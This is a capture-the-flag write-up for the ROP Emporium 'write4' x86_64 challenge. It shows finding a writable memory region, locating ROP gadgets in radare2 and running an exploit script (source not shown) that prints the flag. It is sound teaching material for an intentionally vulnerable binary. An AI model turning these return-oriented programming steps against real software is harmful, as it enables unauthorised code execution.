# ROP Emporium - 04 write4 x86_64

## ELF Binary Info
> $ `rabin2 -I ./write4`  
```
arch     x86
baddr    0x400000
binsz    6521
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Find readable and writeable area of memory
- 1st terminal, run ELF binary and keep it open
- 2nd terminal, search proc maps of running process for readable and writeable memory:
> $ `cat /proc/$(pgrep -f ./write4)/maps | grep rw`
```  
00601000-00602000 rw-p 00001000 fe:01 656469                             /<write4_filepath>
[...]
```
- Step through binary in GDB and search for free memory between `00601000-00602000` to place "flag.txt" string
- Ensure there are null bytes after chosen memory address so that null terminator does not need to be added manually
> $ `gdb -q ./write4`  
> (gdb) `start`  
> (gdb) `disass pwnme`  
```
Dump of assembler code for function pwnme:
[...]
   0x00007fa8efa1092f <+133>:	call   0x7fa8efa10770 <read@plt>
   0x00007fa8efa10934 <+138>:	lea    rdi,[rip+0xf1]        # 0x7fa8efa10a2c
   0x00007fa8efa1093b <+145>:	call   0x7fa8efa10730 <puts@plt>
[...]
End of assembler dump.
```
- Set breakpoint after read() instruction
> (gdb) `b *pwnme+138`  
> (gdb) `c`  
```
Continuing.
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAAAAAA
```
> (gdb) `x/512gx 0x601000`  
```
[...]
0x6019f0:	0x0000000000000000	0x0000000000000000
0x601a00:	0x0000000000000000	0x0000000000000000
0x601a10:	0x0000000000000000	0x0000000000000000
[...]
```
- Memory address `0x601a00` looks like it matches criteria

## Get ROP Gadgets
> $ `r2 -A ./write4`  
- Search for gadget that writes to memory
> [0x00400520]> `/R mov qword`  
```
[...]
  0x00400628             4d893e  mov qword [r14], r15
  0x0040062b                 c3  ret
[...]
```
- Search for gadget that pops r14 and pops r15
> [0x00400520]> `/R pop r14`  
```
[...]
  0x00400690               415e  pop r14
  0x00400692               415f  pop r15
  0x00400694                 c3  ret
```
- Search for gadget that pops rdi
> [0x00400520]> `/R pop rdi`  
```
  0x00400693                 5f  pop rdi
  0x00400694                 c3  ret
```
- Luckily there's a function that prints from file
> [0x00400520]> `pdf @ sym.usefulFunction`  
```
╭ 17: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; "nonexistent"
│           0x00400620      e8ebfeffff     call sym.imp.print_file
│           0x00400625      90             nop
│           0x00400626      5d             pop rbp
╰           0x00400627      c3             ret
```

## Get Flag
> $ `python get_flag.py`  
```
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
